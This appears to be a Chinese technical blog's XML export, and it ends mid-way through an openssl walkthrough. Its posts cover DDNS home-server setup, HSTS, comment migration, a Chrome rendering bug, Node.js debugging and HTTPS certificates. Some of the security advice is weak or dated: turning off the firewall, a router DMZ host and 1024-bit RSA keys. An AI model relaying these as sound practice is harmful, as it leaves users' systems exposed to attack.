如果你有一个域名，你可以将域名解析服务器迁移到 DNSPod 提供的 NS，然后新增一个子域名添加 A 记录到任意 IP，接着通过 DNSPod 提供的接口实时修改 A 记录的 IP 地址 如果你既没有服务器，也没有自己的域名，可以在花生壳上注册一个域名，然后在你的路由器上（如果支持）配置花生壳，如果你的路由器不支持花生壳动态域名配置，你得下载一个花生壳的客户端，在客户端上配置。最终的结果同上，花生壳提供给你的免费域名会指向你的本地 IP。 我的博客托管在 github 提供的静态文本服务中，之前买的主机也到期了，所以就选择了方案二。 1. 先拿到本地 IP 在命令行输入 ifconfig/ipconfig 只能拿到路由器 DHCP 分配的地址，如 192.168.0.110，想拿到 IP，必须跟外网打交道，比如：curl ipinfo.io。 12345678910➜ ddns git:(master) ✗ curl ipinfo.io&#123; &quot;ip&quot;: &quot;115.*.*.*&quot;, &quot;hostname&quot;: &quot;No Hostname&quot;, &quot;city&quot;: &quot;Hangzhou&quot;, &quot;region&quot;: &quot;Zhejiang Sheng&quot;, &quot;country&quot;: &quot;CN&quot;, &quot;loc&quot;: &quot;30.*,120.*&quot;, &quot;org&quot;: &quot;*&quot;&#125;% 如上所示，通过 ipinfo.io 提供的服务，我们可以很方便拿到外网。 2. 推到 DNSPod 如果你在其他域名提供商购买的域名，你需要将你的域名解析从提供商迁移到 DNSPod，这方面的迁移网上资料很多，可以搜索一下。DNSPod 相比其他提供商的域名解析服务，要更加优质，而且提供了 D监控，实时为你的域名解析保驾护航，有问题会及时邮件、短信警报。 接着在你的 DNSPod 上添加一个二级域名，比如我就随便搞了一个 proxy.barretlee.com，将它 A记录到任意地址，如 8.8.8.8。 这一步完成之后，你就可以通过 DNSPod 提供的接口修改 A 记录了。具体用到了三个接口： 1) //dnsapi.cn/Domain.List 1curl -k //dnsapi.cn/Domain.List -d "login_email=YOUR_REGISTER_EMAIL&amp;login_password=YOUR_PASSWORD&amp;format=json" 我在后面加了一个参数 format=json，默认是 xml 格式。在这里可以拿到 Domain 信息，比如我就拿到了在 DNSPod 上的两个域名信息，一个是 barret.cc 的具体信息，一个是 barretlee.com 的具体信息。这里有用的是 barretlee.com 中的 id 字段，我拿到的值为 25348135。 2) //dnsapi.cn/Record.List 1curl -k //dnsapi.cn/Record.List -d "login_email=YOUR_REGISTER_EMAIL&amp;login_password=YOUR_PASSWORD&amp;format=json&amp;domain_id=25348135" 通过这个接口，可以拿到 barretlee.com 所有子域名的信息，proxy.barretlee.com 对应的 record 的 id 字段值为 126112527。 3) //dnsapi.cn/Record.Ddns,//dnsapi.cn/Record.Modify 12345## 查询 proxy.barretlee.com 域名对应的 A 记录curl -X POST //dnsapi.cn/Record.Ddns -d &apos;login_email=YOUR_REGISTER_EMAIL&amp;login_password=YOUR_PASSWORD&amp;format=json&amp;domain_id=25348135&amp;record_id=126112527&amp;record_line=默认&amp;sub_domain=proxy&apos;## 修改 proxy.barretlee.com 域名对应的 A 记录curl -X POST //dnsapi.cn/Record.Modify -d &apos;login_email=YOUR_REGISTER_EMAIL&amp;login_password=YOUR_PASSWORD&amp;format=json&amp;domain_id=25348135&amp;record_id=126112527&amp;sub_domain=proxy&amp;record_line=默认&amp;record_type=A&amp;value=YOUR_LOCAL_IP&apos; 前两个请求是 GET 方式，而这里的请求是 POST 方式，具体文档在 这里。有人用 python 和 php 都写了工具，我就没有重复早轮了，后面 php 那个稍微靠谱点，但是查询本地外网 IP 用了他自己提供的服务，我做了点修改（改成使用 ipinfo.io 提供的服务，稍微靠谱点），可以戳这里： Github：http://github.com/barretlee/ddns 3. 定时推 前文提到，IP 是会变化的，为了保证 proxy.barretlee.com 能够准确解析到本机，IP 变化的时候需要快速更新 A 记录，为了简洁，可以设置定时任务，每隔 1 分钟推送一次： 1234# 执行crontab -e # 写入任务* * * * * php path/to/ddns/index.php 使用 crontab 创建一个定时任务，实时推送。可以通过 crontab -l 查看任务列表。 12# 验证效果ping proxy.barretlee.com 以上就能够通过 proxy.barretlee.com 获取到家里机器的 IP 地址了。需要注意的是，你们家电信宽带服务可能并不是通过路由拨号上网的，当你访问 proxy.barretlee.com 或者拿到的 IP 时，你会看到如下登录提示： 这个时候你就致电 10000，选择人工服务器，让电信帮你设置为通过路由器登录吧~（生效时间估计得二十多分钟，需要重启猫、路由等设备） 让外网可以访问到路由内网的机器上面我们只是解决了，将本机外网的 IP （也就是路由器的 IP）推到 DNSPod，而路由器上是没有装什么软件的，我们不能通过路由器访问到这个小局域网中的任何设备。需要登录到路由器进行一些设置。 一般的路由器都提供了 web 控制界面，在这里我们需要执行如下操作： 1. 将局域网内的某个固定 IP 绑定你的电脑 路由器也是使用 DHCP 随机分配一个 IP 给你的电脑，为了让路由器能够找到你的电脑，可以将电脑的 MAC 地址和 IP 地址对应起来： 路由器一般都会有 “IP与MAC绑定这一项”，找到之后，绑定二者，如图中，我的本机 IP 目前为 192.168.0.110。 2. 将本机 IP 作为对外设备 DMZ 主机也是路由器自带的，通过DMZ主机功能，广域网中的设备可直接访问局域网中的DMZ主机 如果要让局域网中 IP 地址为 192.168.1.110 的主机能够被广域网中的设备直接访问，则可以开启 DMZ 主机功能，在“DMZ主机IP地址”处填入 192.168.1.110 保存即可。 这个操作相当于将路由的 IP 直接赋予给你的电脑。如果你觉得风险过大，可以通过路由提供的虚拟服务器转发端口，比如外网过来的 10002 端口转发到内网的 80 端口，也就是： 这样，通过 proxy.barretlee.com:10002 就能访问到 192.168.1.110 机器提供的 web 服务了。 开始远程控制之旅1. 防火墙 不管是 windows 还是 mac，先查看下你的防火墙，比如你开启了 apache 服务器，就去防火墙看看，这个服务是否允许外部访问，如果不允许，就得设置过来，或者干脆直接关闭防火墙。mac 的防火墙设置在这里： 2. 开启服务 如果你只需要远程登录到 mac，可以 enable ssh server，相当于打开 ssh 的服务器，让机器可以被 ssh 。你也可以在电脑上安装 apache/nginx/nodejs 等等各种服务和程序，你也可以在电脑上设置 vpn server，让电脑作为代理被使用，想怎么折腾就怎么折腾。 小结如果你理解整个流程都在做什么，以上操作可以在一小时内搞定。本文，简单点说，就是教你如何把自己的电脑变成一台可访问的服务器。 关于网速：取决于两端链接的最小网速； 关于稳定性：不断网的话，貌似 IP 也不会变化太快，1 分钟推一次的频率很频繁了； 关于安全：我只给我的电脑开了一个 ssh 的口子，除非 mac 系统本身有漏洞或者 ssh 有漏洞，想黑进来也不是件容易的事情。 好吧，写了一堆，希望给爱折腾的你提供点帮助。]]></content>
      <categories>
        <category>网络技术</category>
      </categories>
      <tags>
        <tag>DDNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你所不知道的 HSTS]]></title>
    <url>%2Fblog%2F2015%2F10%2F22%2F2015-10-22-hsts-intro%2F</url>
    <content type="text"><![CDATA[很多人听说过也看到过 301、302，但是几乎从来没有看到过 303 和 307 的状态码。今天在淘宝首页看到了 307 状态码，于是摸索了一把。 中间人劫持起因是这样，https 使用的是 443 端口进行数据传输，而浏览器的默认端口是 80. 劫持者首先劫持用户的 80 端口，当用户向目标页发起请求时，劫持者模拟正常的 https 请求向源服务器获取数据，然后通过 80 端口返回给用户，大概可以看下下面两张图： 用户一般不会在地址栏输入 //www.taobao.com，而是习惯性输入 taobao.com ，此时浏览器走的是 http，请求到达服务器之后，服务器告诉浏览器 302 跳转 1Location: //www.taobao.com 然后浏览器重新请求，通过 HTTPS 方式，443 端口通讯。而正因为用户不是直接输入 // 链接，劫持者利用这一点： 只要能够劫持你的网络，比如路由劫持、DNS劫持，就可以作为中间人注入代码、替换广告。。。（上了 https 也拗不过电信，真是日了够了） 这种劫持出现在两种情况下： 用户没有通过准确的方式访问页面，除非输入 // ，否则浏览器默认以 http 方式访问 HTTPS 页面的链接中包含 http，这个 http 页面可能被劫持 启用 HSTSHSTS，HTTP Strict Transport Security，简单说就是强制客户端使用 HTTPS 访问页面。其原理就是： 在服务器响应头中添加 Strict-Transport-Security，可以设置 max-age 用户访问时，服务器种下这个头 下次如果使用 http 访问，只要 max-age 未过期，客户端会进行内部跳转，可以看到 307 Redirect Internel 的响应码 变成 https 访问源服务器 这个过程有效避免了中间人对 80 端口的劫持。但是这里存在一个问题：如果用户在劫持状态，并且没有访问过源服务器，那么源服务器是没有办法给客户端种下 Strict-Transport-Security 响应头的（都被中间人挡下来了）。 启用 HSTS 不仅仅可以有效防范中间人攻击，同时也为浏览器节省来一次 302/301 的跳转请求，收益还是很高的。我们的很多页面，难以避免地出现 http 的链接，比如 help 中的链接、运营填写的链接等，这些链接的请求都会经历一次 302，对于用户也是一样，收藏夹中的链接保存的可能也是 http 的。 307 状态码在 GET、HEAD 这些幂等的请求方式上，302、303、307 没啥区别，而对于 POST 就不同了，大部分浏览器 都会302 会将 POST 请求转为 GET，而 303 是规范强制规定将 POST 转为 GET 请求，请求地址为 header 头中的 Location，307 则不一样，规范要求浏览器继续向 Location 的地址 POST 内容。 而在 HSTS 中，307 可以被缓存，缓存时间根据 max-age 而定，一般建议缓存 1 年甚至更长。 HSTS 存在的坑 纯 IP 的请求，HSTS 没法处理，比如 http://2.2.2.2 ， 即便响应头中设置了 STS，浏览器也不会理会（未测试） HSTS 只能在 80 和 443 端口之间切换，如果服务是 8080 端口，即便设置了 STS，也无效（未测试） 如果浏览器证书错误，一般情况会提醒存在安全风险，然是依然给一个链接进入目标页，而 HSTS 则没有目标页入口，所以一旦证书配置错误，就是很大的故障了 如果服务器的 HTTPS 没有配置好就开启了 STS 的响应头，并且还设置了很长的过期时间，那么在你服务器 HTTPS 配置好之前，用户都是没办法连接到你的服务器的，除非 max-age 过期了。 HSTS 能让你的网站在 ssllab 上到 A+（这不是坑） 小结本文简单说明了 HSTS 的基本原理和相关内容，他在全站 https 下有一个较大的正向作用，推荐使用。 P.S：在 Chrome 中打开 chrome://net-internals/#hsts，添加域名之后，可以让浏览器强制对该域名启用 https，所有的 http 请求都会内部转到 https。]]></content>
      <categories>
        <category>网络交互</category>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>HSTS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[三步，将多说评论迁移到 disqus]]></title>
    <url>%2Fblog%2F2015%2F10%2F15%2F2015-10-15-duoshuo-migrate-to-disqus%2F</url>
    <content type="text"><![CDATA[关于多说，我不想多说什么，看看这两篇文章： 嘿，多说，你咋了？要不咱换成 DISQUS 吧~ Disqus，我又回来了！ 开始在网上搜罗了一番，没找到好用的，很多都是 python 写的，表示没学过 python，网上找了 一个方案 试用，出了好几个问题，最终还是没有搞定。所以自己重新捯饬了一个 nodejs 版本的： 仓库地址：http://github.com/barretlee/duoshuo-migrate-to-disqus 参考文档：disqus 格式文档 参考文档：多说格式文档 使用方式第一步 进入到你的多说后台，导出多说数据 1http://&#123;YOUR_DUOSHUO_NAME&#125;.duoshuo.com/admin/tools/export/ 第二步 1234git clone //github.com/barretlee/duoshuo-migrate-to-disqus.gitcd duoshuo-migrate-to-disqusnpm installnode migrate 第三步 进入你的 disqus 后台，将数据导入 1//&#123;YOUR_DISQUS_NAME&#125;.disqus.com/admin/discussions/import/platform/generic/ 如果操作过程中遇到什么问题，可以在本文留言。 如果导入到 disqus 无效，有可能是格式存在问题，或者某个字段的格式不对，这大多是因为多说导出的数据就不对。可以在 disqus.ejs 中加些判断，自己做过滤。 多说这种自杀式的行为颇为可耻！]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>disqus</tag>
        <tag>多说</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次淘宝首页奇葩的渲染问题]]></title>
    <url>%2Fblog%2F2015%2F10%2F14%2F2015-10-14-a-incredible-bug-in-taobao-homepage%2F</url>
    <content type="text"><![CDATA[或许你曾经在 chrome 浏览器上碰到过这样让人瞠目结舌的问题: Hover触发一个层展示, hover离开后, 这个层还遗留残影 浏览器没有清理一个元素渲染的上一个状态, 导致页面多出一个错位的跟该元素一模一样的影子 交互时突然出现一个方形色块, 覆盖在元素上 或者还有更奇葩的… 以上列举到的三个问题, 我在维护淘宝首页的时候都遇到过。这些都是浏览器渲染页面时, 因为渲染引擎的 bug 导致的问题, 不常见, 更加难以写 demo 演示, 它们只在特定的复杂场景下, 程序计算存在误差或者漏洞的时候出现, 尤其是涉及到边界判断的时候。 问题复现很难得有机会让我碰到一个可以复现的, 我把它记录下来了。如下图所示, hover 到学习模块的边界位置时: 手动 hover 和模拟 hover 都有一样的问题, 没有多想, 立马加上了一句话修复了这个问题: 123.channel2 .channel-item &#123; transform: translateZ(0);&#125; 这个不是直觉, 多次遇到这种奇葩问题, 我第一想到的便是使用 3D 加速将这个渲染层隔离渲染, 80% 以上的概率能够解决问题, 而解决问题的关键在于找准加这句代码的 DOM 元素。 探索 bug这个层在我的代码中肯定是不存在的, 我们只能用 bug 来形容这个问题。因为元素刚好贴在 .channel2 的边界, 猜测应该跟层渲染有关, 于是打开了控制台 ESC -&gt; Rendering -&gt; Show layer borders, 看到了这个: 仔细观察, 可以看到, 这个粉色块在瓦片边界和父元素边界之中, 可以断定, 这几个瓦片在渲染的时候存在问题。 这里需要补充下关于瓦片的知识。瓦片, 英文里头称之为 tile, 它是 webkit/blink 渲染页面时的中间过程, 将整个页面分成多个大小一样的瓦片, 并发渲染每个瓦片的内容。一个元素开启 3D 硬件加速之后, 会变成一个独立的层, 这个层的渲染也会被分割成瓦片, 可以想象成一个子页面。 瓦片和瓦片之间的边界计算是处理的难点, 因为渲染的内容不能错位。 其实让我找到问题根本原因的是, rendering 块的颜色, 平时在网页上开启 show layer borders 看到的是半透明的绿色块, 而这里显示的是粉色块, 搜索了下不同色块代表的含义, 没找到具体的文档说明, 但是找到了 代码: 1234// Missing resize invalidations are in salmon pink.SkColor DebugColors::MissingResizeInvalidations() &#123; return SkColorSetARGB(255, 255, 155, 170);&#125; 对应的就是这个颜色, “缺失调整验证”, 在 chromium 的源码仓库中搜了上面的代码, 找到了 具体说明: 123456789101112131415if (!deflated_content_rect.Contains(canvas_playback_rect)) &#123; if (clear_canvas_with_debug_color) &#123; // Any non-painted areas outside of the content bounds are left in // this color. If this is seen then it means that cc neglected to // rerasterize a tile that used to intersect with the content rect // after the content bounds grew. canvas-&gt;save(); canvas-&gt;translate(-canvas_bitmap_rect.x(), -canvas_bitmap_rect.y()); canvas-&gt;clipRect(gfx::RectToSkRect(content_rect), SkRegion::kDifference_Op); canvas-&gt;drawColor(DebugColors::MissingResizeInvalidations(), SkXfermode::kSrc_Mode); canvas-&gt;restore(); &#125;&#125; 这里能看的肯定就是注释啦, 没有太多上下文, 看的挺头痛！大致翻译了下上下几段注释: 即使完全覆盖, 对于触碰到渲染层边界的栅格化处理, 我们依然需要,在上次记录没有覆盖到的纹理下方和纹理化线性过滤的上方,栅格化处理背景颜色。 内容的最后的纹理可能只有部分被栅格覆盖 在内容边界外没有被渲染到的部分将使用 MissingResizeInvalidations 颜色, 如果这个块能够被看见, 那就意味着程序忽视处理了内边边界增长之后栅格化与内容相交的瓦片。 从第三句大致可以了解到, 因为元素的边界增长导致了这个渲染 bug, 回头看了下元素的边界状态, 果然… 直接原因我们看看 hover 上去之后, 层边界的变化: 很明显, 这里的高度溢出了, 但是没有处理, 看了下这个元素的 css, 确实高度上没有做处理, 在元素上添加 123.channel-item &#123; overflow: hidden；&#125; 同样可以解决问题。 最后的解决手段: 层渲染的问题我还是比较喜欢使用 3d 硬件加速来处理, 而 overflow:hidden 这样的 css 布局处理上, 我是不太推荐的, 搞不好就把哪个重要的内容隐藏掉了。 类似问题处理方案如果以后大家遇到类似的问题, 可以打开 chrome 的层和瓦片分析工具, 看看渲染出来的块有没有异常色块, 尤其是粉色块。也可以观察交互过程中, 元素的边界有没有变化。 CSS 在浏览器中的渲染是我们触及比较少的知识, 如果想迅速找到问题, 必须对浏览器的渲染原理有所了解, 并且能够熟练的使用 chrome 提供的调试工具, 这是基础。]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>bug</tag>
        <tag>渲染</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NodeJS的代码调试和性能调优]]></title>
    <url>%2Fblog%2F2015%2F10%2F07%2F2015-10-07-debug-nodejs-in-command-line%2F</url>
    <content type="text"><![CDATA[NodeJS 自 2009 年显露人间，到现在已经六个年头了，由于各种原因，中间派生出了个兄弟，叫做 iojs，最近兄弟继续合体，衍生出了 nodejs4.0 版本，这东西算是 nodejs new 1.0 版本，原班人马都统一到一个战线上。我没有太关注 nodejs 背后的开发，但一直是它的忠实使用者，通读了 v4.1.2 的 文档，感觉从开发者角度去看，也没啥大的变化，所以这两个兄弟分开这么久，主要是在底层内建模块上做改造，上层建筑尚未有大的变更，具体可以看 这篇文章。 如果你一直用着 nodejs，然而一直都在写最基本的小 demo，很少深入的去剖析 nodejs 的性能问题，甚至连如何 debug 代码、如何发现性能问题都不知从哪里下手，那么赶紧往下读吧！ 命令行调试命令行中调试 nodejs 代码，这是最基础的调试技能，如同我们在 Chrome 控制中调试 JS 代码一般，然而却用的很少，因为他太原始，显得比较麻烦。 回顾下，我们平时的调试方式： 在某个需要输入的地方输入 console.log()，打印调试结果 引入 asserts 模块，对调试区域进行 debug 这两种调试方式，都需要我们显式将各种 debug 信息嵌入到我们的业务逻辑代码中，而熟悉了命令行调试之后，我们可以更好地开启自己的调试之旅。NodeJS 给我们提供了 Debugger 模块，内建客户端，通过 TCP 将命令行的输入传送到内建模块以达到调试的目的。 在启动文件时，添加第二个参数 debug： 12345678➜ $ node debug proxy2.js&lt; Debugger listening on port 5858debug&gt; . okbreak in proxy2.js:1&gt; 1 var http = require(&apos;http&apos;); 2 var net = require(&apos;net&apos;); 3 var url = require(&apos;url&apos;);debug&gt; 调试代码的时候存在两个状态，一个是操作调试的位置，比如下一步，进入函数，跳出函数等，此时为 debug 模式；另一个是查看变量的值，比如进入循环中，想查看循环计数器 i 的值，此时为 repl（read-eval-per-line） 状态，在 debug 模式下输入 repl 即可进入 repl 状态： 12345debug&gt; replPress Ctrl + C to leave debug repl&gt; httpprint something about http&gt; 按下 Ctrl+C 可以从 repl 状态回到 debug 状态下，我们也不需要记忆 debug 状态下有多少调试命令，执行 help 即可： 123debug&gt; helpCommands: run (r), cont (c), next (n), step (s), out (o), backtrace (bt), setBreakpoint (sb), clearBreakpoint (cb),watch, unwatch, watchers, repl, restart, kill, list, scripts, breakOnException, breakpoints, version 相关的命令不算很多： 命令 解释 cont, c 进入下一个断点 next, n 下一步 step, s 进入函数 out, o 跳出函数 setBreakpoint(), sb() 在当前行设置断点 setBreakpoint(line), sb(line) 在 line 行设置断点 上面几个是常用的，更多命令可以戳这里。 NodeJS的调试原理我们平时开发都使用 IDE 工具，实际上很多 IDE 工具已经集成了 NodeJS 的调试工具，比如 Eclipse、webStorm 等等，他们的原理依然是利用 Nodejs 的 Debugger 内建模块，在这个基础上进行了封装。 细心的同学会发现，当我们使用 debug 参数打开一个 node 文件时，会输出这样一行文案： 1Debugger listening on port 5858 可以访问下 http://localhost:5858，会看到： 它告诉我们 nodejs 在打开文件的时候启动了内建调试功能，并且监听端口 5858 过来的调试命令。除了在命令行中直接调试之外，我们还可以通过另外两种方式去调试这个代码： node debug &lt;URI&gt;， 通过 URI 连接调试，如 node debug localhost:5858 node debug -p &lt;pid&gt; 通过 PID 链接调试 如果我们使用 --debug 参数打开文件： 1➜ $ node --debug proxy2.js 此时，nodejs 不会进入到命令行模式，而是直接执行代码，但是依然会开启内建调试功能，这就意味着我们具备了远程调试 NodeJS 代码的能力，使用 --debug 参数打开服务器的 nodejs 文件，然后通过： 1➜ $ node debug &lt;服务器IP&gt;:&lt;调试端口，默认5858&gt; 可以在本地远程调试 nodejs 代码。不过这里需要区分下 --debug 和 --debug-brk，前者会执行完所有的代码，一般是在监听事件的时候使用，而后者，不会执行代码，需要等到外部调试接入后，进入代码区。语言表述不会那么生动，读者可以自行测试下。 默认端口号是 5858，如果这个端口被占用，程序会递增端口号，我们也可以指定端口： 12➜ node node --debug-brk=8787 proxy2.jsDebugger listening on port 8787 更多的调试方式node-inspectorNodeJS 提供的内建调试十分强大，它告诉 V8，在执行代码的时候中断程度，等待开发者操控代码的执行进度。我们熟知的 node-inspector 也是用的这个原理。 1➜ $ node-inspector --web-port 8080 --debug-port 5858 这里的 --web-port 是 Chrome Devtools 的调试页面地址端口，--debug-port 为 NodeJS 启动的内建 debug 端口，我们可以在 http://localhost:8080/debug?port=5858 打开页面，调试使用 --debug(-brk) 参数打开的程序。 更多设置可以查阅官方文档。 IDE调试Eclipse 和 webstorm 的工具栏中都有一个叫做 Run 的选择栏，在这里可以配置该文件的执行方式，比如在 webstorm 中（Navigation&gt;Run&gt;Edit Configurations）： 第一步，为程序添加一个启动程序 如果没有 Nodejs 的选项（如在 phpstorm 中），可以手动配置下。 第二步，配置执行项 Node interpreter 是你 node 程序的位置 Node parameters 是开启 nodejs 程序的选项，如果使用了 ES6 特性，需要开始 --harmony 模式，如果需要远程调试程序，可以使用 --debug 命令，我们采用控制台调试，显然是不需要添加 --debug 参数的。 Working directory 是文件的目录 Javascript file 是需要调试的文件 第三步，断点，调试 其他 IDE 工具的调试大同小异，其原理也是通过 TCP 连接到 Nodejs 开启的内建调试端口。 发现程序的问题上面介绍了 NodeJS 调试需要掌握的几个基本技能，掌握起来还是很轻松的，但是要自己去尝试下。 Nodejs 相比 Java、PHP 这些老牌语言，其周边设施还是有所欠缺的，如性能分析和监控工具等，加上它的单线程运行特性，在大型应用中，很容易让系统的 CPU 或者内存达到瓶颈，从而导致程序崩溃。一旦发现程序警报 CPU 负载过高，或者内存飙高时，我们该如何深入排查 NodeJS 代码存在的问题呢？ 首先来分析下问题，内存飙高存在哪些方面的因素呢： 缓存，很多人在敲程序的时候把缓存当内存用，比如使用一个对象储存用户的 session 信息 闭包，作用域没有被释放掉 生产者和消费者存在速度差，比如数据库忙不过来，Query 队列堆积 CPU 负载过高预警可能因素： 垃圾回收频率过高、量太大，这一般是因为内存或者缓存暴涨导致的 密集型的长循环计算，比如大量遍历文件夹、大量计算等 这些问题是最让人头疼的，一个项目几十上百个文件，收到这些警报如果没有经验，根本无从下手排查。 最直接的手段就是分析 GC 日志，因为程序的一举一动都会反馈到 GC 上，而上述问题也会一一指向 GC，如： 内存暴涨，尤其是 Old Space 内存的暴涨，会直接导致 GC 的次数和时间增长 缓存增加，导致 GC 的时间增加，无用遍历过多 密集型计算，导致 GC Now Space次数增加 这里需要稍微插一段，NodeJS 的内存管理和垃圾回收机制。 V8 的内存分为 New Space 和 Old Space，New Space 的大小默认为 8M，Old Space 的大小默认为 0.7G，64位系统这两个数值翻倍。 对象的生命周期是：首先进入 New Space，在这里，New Space 被平均分为两份，每次 GC 都会将一份中的活着的对象复制到另一份，所以它的空间使用率是 50%，这个算法叫做 Cheney 算法，这个操作叫做 Scavenge。过一段时间，如果 New Space 中的对象还活着，会被挪到 Old Space 中去，GC 会每隔一段时间遍历 Old Space 中死掉的对象，然后整理碎片（这里有两种模式 mark-sweep 和 mark-compact，不祥述）。上面提到的”死掉“，指的是对象已经没有被引用了，活着说被引用的次数为零了。 知道这些之后，我们就好分析问题了，如果缓存增加（比如使用对象缓存了很多用户信息），GC 是不知道这些缓存死了还是活着的，他们会不停地查看这个对象，以及这个对象中的子对象是否还存活，如果这个对象数特别大，那么 GC 遍历的时间也会特别长。当我们进行密集型计算的时候，会产生很多中间变量，这些变量往往在 New Space 中就死掉了，那么 GC 也会在这里多次地进行 New Space 区域的垃圾回收。 分析 GC 日志说了这么多，如何去分析 GC 的日志？ 在启动程序的时候添加 --trace_gc 参数，V8 在进行垃圾回收的时候，会将垃圾回收的信息打印出来： 123456789➜ $ node --trace_gc aa.js...[94036] 68 ms: Scavenge 8.4 (42.5) -&gt; 8.2 (43.5) MB, 2.4 ms [allocation failure].[94036] 74 ms: Scavenge 8.9 (43.5) -&gt; 8.9 (46.5) MB, 5.1 ms [allocation failure].[94036] Increasing marking speed to 3 due to high promotion rate[94036] 85 ms: Scavenge 16.1 (46.5) -&gt; 15.7 (47.5) MB, 3.8 ms (+ 5.0 ms in 106 steps since last GC) [allocation failure].[94036] 95 ms: Scavenge 16.7 (47.5) -&gt; 16.6 (54.5) MB, 7.2 ms (+ 1.3 ms in 14 steps since last GC) [allocation failure].[94036] 111 ms: Mark-sweep 23.6 (54.5) -&gt; 23.2 (54.5) MB, 6.2 ms (+ 15.3 ms in 222 steps since start of marking, biggest step 0.3 ms) [GC interrupt] [GC in old space requested].... V8 提供了很多程序启动选项： 启动项 含义 –max-stack-size 设置栈大小 –v8-options 打印 V8 相关命令 –trace-bailout 查找不能被优化的函数，重写 –trace-deopt 查找不能优化的函数 这些启动项都可以让我们查看 V8 在执行时的各种 log 日志，对于排查隐晦问题比较有用。然而这堆日志并不太好看，我们可以将日志输出来之后交给专业的工具帮我们分析，相比很多人都用过 Chrome DevTools 的 JavaScript CPU Profile，它在这里： 通过 Profile 可以找到具体函数在整个程序中的执行时间和执行时间占比，从而分析到具体的代码问题，V8 也提供了 Profile 日志导出： 1➜ $ node --prof test.js 执行命令之后，会在该目录下产生一个 *-v8.log 的日志文件，我们可以安装一个日志分析工具 tick: 123456789101112131415➜ $ sudo npm install tick -g➜ $ node-tick-processor *-v8.log[Top down (heavy) profile]: Note: callees occupying less than 0.1% are not shown. inclusive self name ticks total ticks total 426 36.7% 0 0.0% Function: ~&lt;anonymous&gt; node.js:27:10 426 36.7% 0 0.0% LazyCompile: ~startup node.js:30:19 410 35.3% 0 0.0% LazyCompile: ~Module.runMain module.js:499:26 409 35.2% 0 0.0% LazyCompile: Module._load module.js:273:24 407 35.1% 0 0.0% LazyCompile: ~Module.load module.js:345:33 406 35.0% 0 0.0% LazyCompile: ~Module._extensions..js module.js:476:37 405 34.9% 0 0.0% LazyCompile: ~Module._compile module.js:378:37... 我们也可以使用 headdump 之类的工具将日志导出，然后放到 Chrome 的 Profile 中去分析。 小结本文主要从 NodeJS 程序的调试手段上，以及调试性能的入口上做了简要的介绍，希望对你有所启发，不到之处还请斧正！]]></content>
      <categories>
        <category>工具</category>
        <category>前端杂烩</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>nodejs</tag>
        <tag>debugger</tag>
        <tag>commandLine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTPS证书生成原理和部署细节]]></title>
    <url>%2Fblog%2F2015%2F10%2F05%2F2015-10-05-how-to-build-a-https-server%2F</url>
    <content type="text"><![CDATA[今天摸索了下 HTTPS 的证书生成，以及它在 Nginx 上的部署。由于博客托管在 github 上，没办法部署证书，先记录下，后续有需要方便快捷操作。本文的阐述不一定完善，但是可以让一个初学者了解大致的原理，同时跟着操作可以为自己的博客/网站部署一个 HTTPS 证书。 网站部署 HTTPS 的重要性看看下面，部分电信用户访问京东首页的时候，会看到右下角有一个浮动广告： 小白用户以为是京东有意放置的，细心的用户会发现，这个 iframe 一层嵌一层的恶心广告很明显是电信/中间人通过 DNS 劫持注入进去的，十分恶心，没有关闭按钮。 随着互联网的快速发展，我们几乎离不开网络了，聊天、预订酒店、购物等等，我们的隐私无时无刻不暴露在这庞大的网络之中，HTTPS 能够让信息在网络中的传递更加安全，增加了 haker 的攻击成本。 HTTPS 区别于 HTTP，它多了加密(encryption)，认证(verification)，鉴定(identification)。它的安全源自非对称加密以及第三方的 CA 认证。 简述 HTTPS 的运作 如上图所示，简述如下： 客户端生成一个随机数 random-client，传到服务器端（Say Hello) 服务器端生成一个随机数 random-server，和着公钥，一起回馈给客户端（I got it) 客户端收到的东西原封不动，加上 premaster secret（通过 random-client、random-server 经过一定算法生成的东西），再一次送给服务器端，这次传过去的东西会使用公钥加密 服务器端先使用私钥解密，拿到 premaster secret，此时客户端和服务器端都拥有了三个要素：random-client、random-server 和 premaster secret 此时安全通道已经建立，以后的交流都会校检上面的三个要素通过算法算出的 session key CA 数字证书认证中心如果网站只靠上图运作，可能会被中间人攻击，试想一下，在客户端和服务端中间有一个中间人，两者之间的传输对中间人来说是透明的，那么中间人完全可以获取两端之间的任何数据，然后将数据原封不动的转发给两端，由于中间人也拿到了三要素和公钥，它照样可以解密传输内容，并且还可以篡改内容。 为了确保我们的数据安全，我们还需要一个 CA 数字证书。HTTPS的传输采用的是非对称加密，一组非对称加密密钥包含公钥和私钥，通过公钥加密的内容只有私钥能够解密。上面我们看到，整个传输过程，服务器端是没有透露私钥的。而 CA 数字认证涉及到私钥，整个过程比较复杂，我也没有很深入的了解，后续有详细了解之后再补充下。 CA 认证分为三类：DV ( domain validation)，OV ( organization validation)，EV ( extended validation)，证书申请难度从前往后递增，貌似 EV 这种不仅仅是有钱就可以申请的。 对于一般的小型网站尤其是博客，可以使用自签名证书来构建安全网络，所谓自签名证书，就是自己扮演 CA 机构，自己给自己的服务器颁发证书。 生成密钥、证书第一步，为服务器端和客户端准备公钥、私钥 12345678910# 生成服务器端私钥openssl genrsa -out server.key 1024# 生成服务器端公钥openssl rsa -in server.key -pubout -out server.pem# 生成客户端私钥openssl genrsa -out client.key 1024# 生成客户端公钥openssl rsa -in client.key -pubout -out client.pem 第二步，生成 CA 证书 123456# 生成 CA 私钥openssl genrsa -out ca.key 1024# X.509 Certificate Signing Request (CSR) Management.openssl req -new -key ca.key -out ca.csr# X.509 Certificate Data Management.openssl x509 -req -in ca.csr -signkey ca.key -out ca.crt 在执行第二步时会出现： 123456789101112131415➜ keys openssl req -new -key ca.key -out ca.csrYou are about to be asked to enter information that will be incorporatedinto your certificate request.What you are about to enter is what is called a Distinguished Name or a DN.There are quite a few fields but you can leave some blankFor some fields there will be a default value,If you enter '.', the field will be left blank.-----Country Name (2 letter code) [AU]:CNState or Province Name (full name) [Some-State]:ZhejiangLocality Name (eg, city) []:HangzhouOrganization Name (eg, company) [Internet 